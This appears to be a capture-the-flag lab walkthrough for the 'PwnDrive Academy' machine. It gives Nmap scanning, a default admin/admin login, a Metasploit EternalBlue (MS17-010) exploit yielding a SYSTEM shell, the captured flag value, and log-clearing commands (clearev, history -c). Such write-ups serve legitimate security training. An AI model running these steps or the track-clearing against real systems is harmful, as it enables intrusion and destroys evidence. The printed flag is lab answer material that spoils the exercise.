# Penetration Testing Walkthrough PwnDrive Academy

## Overview
This report details the PwnDrive Academy challenge, where the goal was to exploit vulnerabilities in order to gain unauthorized access and ultimately capture the flag
## Target Information

| Attribute          | Details                 |
|--------------------|-------------------------|
| Hostname           | PwnDrive Academy        |
| Target IP          | 10.150.150.11           |
| Operating System   | Windows Server 2008 R2  |
| Attacker IP        | 10.66.67.114            |
| Difficulty Level   | Easy                    |

# 1.Reconnaissance
Initial reconnaissance was performed using Nmap to identify active hosts and open services. A ping sweep confirmed the target IP was live. A detailed port scan revealed:
- Port 21 (FTP): Xlight FTP Server 3.9
- Port 80/443 (Web): Apache hosting a custom application named PwnDrive
- Port 1433 (Database): Microsoft SQL Server 2012
- Port 445 (SMB): Windows file sharing service
  
After download PwnTillDawn.ovpn use code below:
```bash
cd ~/Downloads
```
```bash
sudo openvpn PwnTillDawn.ovpn
```
Attacker IP
```bash
10.66.67.114
```
perform a ping scan on the 10.150.150.0/24 network, checking which devices are currently online and active within that specific network range, without trying to find open ports or other detailed information. 
```bash
nmap -sn 10.150.150.0/24
```
The operating system was identified as Windows Server 2008 R2, which is known to be vulnerable if unpatched.

# 2. Scanning
A deeper port scan was carried out to enumerate services, software versions, and OS details:
```bash
nmap -sC -sV -T4 10.150.150.11
```
Findings:
- OS: Windows Server 2008 R2 (detected via SMB on port 445).
- Web Services: Apache hosting “PwnDrive – Your Personal Online Storage” on ports 80/443.
- FTP: Xlight ftpd 3.9 running on port 21.
- Database: Microsoft SQL Server 2012 exposed on port 1433, with hostname “PWNDRIVE.”

# 3. Gaining Access
Visiting bash```http://10.150.150.11``` revealed a custom cloud storage app with a login page.
Common credentials were attempted:
```bash
username: admin
password: admin
```
This successfully authenticated us as the administrator.


Nmap was used to test for MS17‑010 (EternalBlue):
```bash
nmap -p445 --script smb-vuln-ms17-010 10.150.150.11
```
The host was confirmed vulnerable.
Launching Metasploit:
```bash
msfconsole
search eternal
```

The relevant module bash```exploit/windows/smb/ms17_010_eternalblue``` was selected.

Loading the Exploit:
```bash
use 0
options
```

Configuring Targets:
```bash
set RHOST 10.150.150.11
set LHOST tun0
```

Executing:
```bash
exploit
```

A Meterpreter session was successfully opened.

Spawning a Shell:
```bash
shell
```

Navigating to the Flag:
```bash
cd ..\..\Users
dir
cd Administrator
dir Desktop
type Desktop\FLAG1.txt
```

Captured flag:
```bash
PwnTillDawnAcademyIsAwesome!!!
```
# 4. Escalate Privilege
Because the EternalBlue vulnerability is extremely critical, exploiting it does not just provide initial access but immediately elevates the attacker to SYSTEM‑level privileges, the highest authority available on a Windows machine. This means that instead of starting with a restricted user account and searching for ways to escalate, the exploit itself automatically delivers full administrative control, allowing unrestricted navigation of the file system, direct access to sensitive data, and the ability to execute commands with complete authority over the operating system.

# 5. Maintain Access
Once administrative control is achieved, attackers often establish persistence to ensure they can reconnect even if the initial exploit is patched or the system is rebooted. Common techniques include creating scheduled tasks, modifying registry entries, or deploying backdoors that automatically launch at startup.

Maintaining long‑term access was unnecessary. The primary objective is gaining SYSTEM level privileges and retrieving the flag  had already been completed. Documenting persistence methods is still important, as it demonstrates awareness of how attackers could extend their foothold beyond the initial compromise, but no additional steps were required in this scenario.

# 6.  Clearing Tracks
Persistence was not necessary for this engagement. To remove traces:
```bash
clearev
exit
history -c
```


